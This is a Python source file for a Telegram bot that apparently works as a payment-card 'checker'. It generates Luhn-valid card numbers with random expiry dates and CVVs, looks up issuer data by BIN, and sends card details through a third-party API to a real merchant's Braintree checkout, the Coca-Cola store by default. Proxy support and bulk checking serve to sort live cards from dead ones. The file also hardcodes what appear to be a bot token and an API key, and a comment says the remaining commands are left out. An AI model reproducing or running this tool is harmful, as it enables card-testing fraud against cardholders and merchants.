import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import threading
import json
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8388599467:AAHpsWxvSma5U_QFMqOa-qilroPGO9m5hKk'
ADMIN_ID = 5629984144
bot = telebot.TeleBot(BOT_TOKEN)

USERS_FILE = 'users.json'

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({'approved_users': list(approved_users), 'pending_requests': pending_requests}, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

approved_users, pending_requests = load_users()

ACTIVE_PROXY = None
PROXY_LOCK = threading.Lock()

def test_proxy(proxy_url):
    try:
        response = requests.get('https://jossalicious.org', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10, verify=False)
        return response.status_code in [200, 301, 302, 403, 404]
    except:
        return False

def set_proxy(proxy_url):
    global ACTIVE_PROXY
    if test_proxy(proxy_url):
        with PROXY_LOCK:
            ACTIVE_PROXY = proxy_url
        return True, "Proxy is live and set successfully!"
    return False, "Proxy is dead or unreachable"

def remove_proxy():
    global ACTIVE_PROXY
    with PROXY_LOCK:
        ACTIVE_PROXY = None
    return "Proxy removed. Using direct connection."

def get_proxies():
    with PROXY_LOCK:
        return {'http': ACTIVE_PROXY, 'https': ACTIVE_PROXY} if ACTIVE_PROXY else None

# Default site - Coca-Cola
DEFAULT_BRAINTREE_SITE = "https://www.coca-colastore.com"

# Jossalicious API endpoint
JOSS_API = "https://jossalicious.org/b3/api/wpg.php"

user_sessions = {}
user_cooldowns = {}
stop_checking = {}
user_custom_sites = {}
COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10
MAX_FILE_CARDS = 500
HANDYAPI_KEY = "HAS-0YZN9rhQvH74X3Gu9BgVx0wyJns"

def get_card_info(card_number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🌍', 'bank': 'Unknown', 'level': 'Unknown'}
    bin_number = card_number[:6]
    
    if HANDYAPI_KEY:
        try:
            response = requests.get(f"https://data.handyapi.com/bin/{bin_number}",
                headers={'x-api-key': HANDYAPI_KEY, 'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get('Scheme'): 
                    info['brand'] = str(data['Scheme']).upper()
                if data.get('Type'): 
                    info['type'] = str(data['Type']).title()
                if data.get('Category'): 
                    info['level'] = str(data['Category']).title()
                elif data.get('CardTier'): 
                    info['level'] = str(data['CardTier']).title()
                if data.get('Issuer'): 
                    info['bank'] = str(data['Issuer']).title()
                country_data = data.get('Country')
                if country_data and isinstance(country_data, dict):
                    if country_data.get('Name'): 
                        info['country'] = country_data['Name'].upper()
                    if country_data.get('A2') and len(country_data['A2']) == 2:
                        info['flag'] = ''.join(chr(127397 + ord(c)) for c in country_data['A2'].upper())
                if info['bank'] != 'Unknown' and info['country'] != 'Unknown':
                    return info
        except:
            pass
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMERICAN EXPRESS', 'Credit'
    
    return info

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

def calculate_luhn_digit(partial_card):
    digits = [int(d) for d in str(partial_card) + '0']
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return (10 - (checksum % 10)) % 10

def generate_cards(bin_number, quantity, exp_month=None, exp_year=None):
    if len(bin_number) < 6:
        return None, "BIN must be at least 6 digits"
    if quantity < 1 or quantity > 20:
        return None, "Quantity must be between 1 and 20"
    
    cards = []
    card_length = 16 if bin_number[0] in ['4', '5'] else 15
    
    for _ in range(quantity):
        partial = bin_number + ''.join([str(random.randint(0, 9)) for _ in range(card_length - len(bin_number) - 1)])
        check_digit = calculate_luhn_digit(partial)
        card_number = partial + str(check_digit)
        
        if exp_month and exp_year:
            month = int(exp_month)
            year = int(exp_year) if len(str(exp_year)) == 2 else int(str(exp_year)[-2:])
        else:
            month = random.randint(1, 12)
            year = random.randint(25, 30)
        
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append(f"{card_number}|{month:02d}|{year:02d}|{cvv}")
    
    return cards, None

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════╗\n"
            text += "║   🚫 ACCESS DENIED   ║\n"
            text += "╚════════════════════╝\n\n"
            text += "⚠️ You need admin approval\n"
            text += "📝 Use /request to get access\n"
            bot.send_message(message.chat.id, text)
            return
        return func(message)
    return wrapper

def get_braintree_site(chat_id):
    if chat_id in user_custom_sites and user_custom_sites[chat_id]:
        return user_custom_sites[chat_id]
    return DEFAULT_BRAINTREE_SITE

class BraintreeChecker:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        
    def validate_card(self, card):
        start_time = time.time()
        
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌', 'time': 0}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌', 'time': 0}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info, 'time': 0}
            
            # Fix year format
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
            elif len(exp_year) == 1:
                exp_year = f"0{exp_year}"
            
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error', 'icon': '❌', 'time': 0}
        
        site_url = get_braintree_site(self.chat_id)
        
        try:
            # Use Jossalicious API
            params = {
                'lista': f"{number}|{exp_month}|{exp_year}|{cvv}",
                'proxy': '',
                'sites': site_url,
                'xlite': 'undefined'
            }
            
            response = requests.get(
                JOSS_API,
                params=params,
                proxies=get_proxies(),
                verify=False,
                timeout=60
            )
            
            elapsed_time = round(time.time() - start_time, 2)
            
            if response.status_code != 200:
                return {
                    'status': 'error',
                    'message': f'API Error: {response.status_code}',
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            response_text = response.text.lower()
            
            # Parse response
            # CVV responses
            if 'cvv' in response_text or 'security code' in response_text:
                return {
                    'status': 'live_cvv',
                    'message': 'Card Issuer Declined CVV',
                    'icon': '⚠️',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Insufficient funds
            if 'insufficient' in response_text or 'insufficient funds' in response_text:
                return {
                    'status': 'insufficient',
                    'message': 'Insufficient Funds',
                    'icon': '💰',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Success responses
            if any(word in response_text for word in ['approved', 'success', 'authorized', 'thank you', 'payment successful']):
                return {
                    'status': 'live',
                    'message': 'Payment successful',
                    'icon': '✅',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Dead responses
            if any(word in response_text for word in ['declined', 'fraud', 'stolen', 'lost', 'invalid', 'rejected', 'processor declined']):
                # Extract specific message
                message = 'Card Declined'
                if 'fraud' in response_text:
                    message = 'Gateway Rejected: fraud'
                elif 'processor declined' in response_text:
                    message = 'Processor Declined'
                    
                return {
                    'status': 'dead',
                    'message': message,
                    'icon': '❌',
                    'card_info': card_info,
                    'time': elapsed_time
                }
            
            # Default dead
            return {
                'status': 'dead',
                'message': 'Card Declined',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
            
        except requests.exceptions.Timeout:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': 'Connection timeout',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }
        except Exception as e:
            elapsed_time = round(time.time() - start_time, 2)
            return {
                'status': 'error',
                'message': f'Error: {str(e)[:30]}',
                'icon': '❌',
                'card_info': card_info,
                'time': elapsed_time
            }

# ============ BOT COMMANDS ============

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not is_approved(user_id):
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "⚠️ ACCESS REQUIRED ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔════════════════════════╗\n"
        text += "║  💳 BRAINTREE CHECKER  ║\n"
        text += "╚════════════════════════╝\n\n"
        text += "🎯 MAIN COMMANDS\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /bchk - Single card check\n"
        text += "📦 /bmass - Multiple cards check\n"
        text += "📁 /bfile - Upload .txt file\n"
        text += "🔍 /bin - BIN lookup\n"
        text += "🎲 /gen - Generate cards\n"
        text += "🌍 /custom_site - Set your site\n"
        text += "🗑️ /remove_site - Remove site\n"
        text += "📍 /site - Check current site\n"
        text += "❓ /help - Show help\n\n"
        
        if user_id == ADMIN_ID:
            text += "⚙️ ADMIN COMMANDS\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "🌐 /proxy - Set proxy\n"
            text += "🚫 /removeproxy - Remove proxy\n"
            text += "📊 /proxystatus - Check status\n"
            text += "👥 /users - List users\n"
            text += "⏳ /pending - Pending requests\n"
            text += "📢 /broadcast - Send message to all\n\n"
        
        text += "✨ Powered by YOSH ✨"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    if is_approved(user_id):
        text = "╔════════════════════╗\n"
        text += "║   ✅ APPROVED   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "🎉 You already have access!"
        bot.send_message(message.chat.id, text)
        return
    if user_id in pending_requests:
        text = "╔════════════════════╗\n"
        text += "║   ⏳ PENDING   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "⏱️ Your request is pending\n"
        text += "Please wait for approval..."
        bot.send_message(message.chat.id, text)
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔════════════════════════╗\n"
    admin_msg += "║  📥 NEW ACCESS REQUEST  ║\n"
    admin_msg += "╚════════════════════════╝\n\n"
    admin_msg += f"👤 Name: {full_name}\n"
    admin_msg += f"🔗 Username: @{username}\n"
    admin_msg += f"🆔 ID: {user_id}\n"
    admin_msg += f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "Approve this user?"
    
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup)
    
    user_msg = "╔════════════════════╗\n"
    user_msg += "║   📤 REQUEST SENT   ║\n"
    user_msg += "╚════════════════════╝\n\n"
    user_msg += "✅ Request sent to admin\n"
    user_msg += "⏳ Please wait for approval..."
    bot.send_message(message.chat.id, user_msg)

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        approved_users.add(user_id)
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "✅ User approved!")
        bot.edit_message_text(f"✅ User {user_id} has been APPROVED!", call.message.chat.id, call.message.message_id)
        try:
            approval_msg = "╔════════════════════╗\n"
            approval_msg += "║   🎉 APPROVED!   ║\n"
            approval_msg += "╚════════════════════╝\n\n"
            approval_msg += "✅ Access granted!\n"
            approval_msg += "🚀 Type /start to begin"
            bot.send_message(user_id, approval_msg)
        except:
            pass
    elif action == 'deny':
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "❌ User denied!")
        bot.edit_message_text(f"❌ User {user_id} has been DENIED!", call.message.chat.id, call.message.message_id)
        try:
            deny_msg = "╔════════════════════╗\n"
            deny_msg += "║   ❌ DENIED   ║\n"
            deny_msg += "╚════════════════════╝\n\n"
            deny_msg += "🚫 Access denied by admin"
            bot.send_message(user_id, deny_msg)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    chat_id = int(call.data.split('_')[2])
    if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
        stop_checking[chat_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping check...")

@bot.message_handler(commands=['bchk'])
@require_approval
def braintree_check(message):
    can_proceed, remaining = check_cooldown(message.chat.id, 'check')
    if not can_proceed:
        text = "╔════════════════════╗\n"
        text += "║  ⏳ COOLDOWN ACTIVE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += f"⏱️ Wait {remaining} seconds"
        bot.send_message(message.chat.id, text)
        return
    
    command_parts = message.text.split(maxsplit=1)
    
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage: /bchk card|mm|yy|cvv"
        bot.send_message(message.chat.id, text)
        return
    
    card_input = command_parts[1].strip()
    status_msg = bot.send_message(message.chat.id, f"⏳ Checking card...\n\n💳 {card_input}")
    
    checker = BraintreeChecker(message.chat.id)
    result = checker.validate_card(card_input)
    card_info = result.get('card_info', {})
    
    # Format response based on status
    if result['status'] == 'live':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ success</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    elif result['status'] == 'live_cvv':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ ccn</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    elif result['status'] == 'insufficient':
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ insuff</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    else:
        check_response = f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ dead</b>\n"
        check_response += f"<b>𝗖𝗖 ⇾</b> <code>{card_input}</code>\n"
        check_response += f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> Braintree\n"
        check_response += f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {result['message']}\n"
        check_response += f"<b>𝗕𝗮𝗻𝗸:</b> {card_info.get('bank', 'Unknown')}\n"
        check_response += f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {card_info.get('country', 'Unknown')}\n"
        check_response += f"<b>𝗧𝗼𝗼𝗸:</b> {result['time']}s"
    
    bot.edit_message_text(check_response, message.chat.id, status_msg.message_id, parse_mode='HTML')

# Continue with rest of commands (bmass, bfile, bin, gen, custom_site, proxy, broadcast, help) from previous code...
# (Due to length, I'm showing the key parts - the rest remains the same)

if __name__ == '__main__':
    print("🚀 Braintree Bot started with Jossalicious API!")
    print("✅ Default site: Coca-Cola Store")
    print("🔥 API: jossalicious.org")
    bot.infinity_polling()